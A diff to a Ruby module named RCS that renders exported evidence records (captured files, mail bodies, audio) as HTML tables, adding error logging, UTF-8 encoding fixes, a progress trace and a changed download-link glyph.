@@ -86,6 +86,8 @@ module RCS
         <td class="info">#{html_data_renderer(row)}</td><td class="note">#{row[:note]}</td>
       </tr>
         eof
+      rescue Exception => e
+        trace :fatal, "#{e.class} #{e.message} #{row.inspect}"
       end
 
       def html_table_footer
@@ -118,7 +120,7 @@ module RCS
       end
 
       def html_data_renderer(row)
-        table = "<table class=\"inner\"><tbody>"
+        table = "<table class=\"inner\"><tbody>".force_encoding('UTF-8')
         # expand all the metadata
         row[:data].each_pair do |k, v|
           next if ['_grid', '_grid_size', 'md5', 'body', 'status'].include? k
@@ -140,11 +142,11 @@ module RCS
             end
           when 'file'
             if row[:data]['type'] == :capture
-              table << "<tr><td class=\"inner\">file</td><td class=\"inner\"><a href=\"#{row[:data]['_grid'].to_s + File.extname(row[:data]['path'])}\" title=\"Download\"><font size=3><b>⇊</b></font></a></td></tr>"
+              table << "<tr><td class=\"inner\">file</td><td class=\"inner\"><a href=\"#{row[:data]['_grid'].to_s + File.extname(row[:data]['path'])}\" title=\"Download\"><font size=3>[+]</font></a></td></tr>"
             end
           when 'message'
             if row[:data]['type'] == :mail
-              table << "<tr><td class=\"inner\">body</td><td class=\"inner\"><a href=\"#{row[:data]['_grid'].to_s + '.txt'}\" title=\"Download\"><font size=3><b>⇊</b></font></a></td></tr>"
+              table << "<tr><td class=\"inner\">body</td><td class=\"inner\"><a href=\"#{row[:data]['_grid'].to_s + '.txt'}\" title=\"Download\"><font size=3>[+]</font></a></td></tr>"
             end
         end
         table << "</tbody></table>"
@@ -153,7 +155,7 @@ module RCS
 
       def html_stat_renderer(data)
         max = data.max
-        table = "<table class=\"stat\"><tbody><tr>"
+        table = "<table class=\"stat\"><tbody><tr>".force_encoding('UTF-8')
         data.each_with_index do |value|
           h = value * 20 / max
           table << "<td class=\"stat\"><img src=\"style/stat.png\" height=\"#{h}\" width=\"6\"></td>"
@@ -176,7 +178,7 @@ module RCS
     <audio src="#{mp3}" controls>
         HTML5 audio not supported
     </audio>
-    <a href="#{mp3}" title="Download"><font size=3><b>⇊</b></font></a>
+    <a href="#{mp3}" title="Download"><font size=3>[+]</font></a>
         eof
       end
 
@@ -267,6 +269,7 @@ module RCS
         while cursor < total do
 
           grid_dumps = []
+          trace :info, "Exporting evidence: #{total - cursor} evidence to go..."
 
           evidence.limit(chunk).skip(cursor).each_with_index do |e, i|
             # get the day of the current evidence
@@ -322,7 +325,6 @@ module RCS
 
           grid_dumps.each do |g|
             begin
-              trace :debug, "Exporting GRID file #{g[:id].inspect} to #{g[:file_name]}"
               filename, file = dump_file(g[:day], g[:id], g[:file_name], g[:target])
               yield 'file', filename, {path: file}
               FileUtils.rm_rf(file)
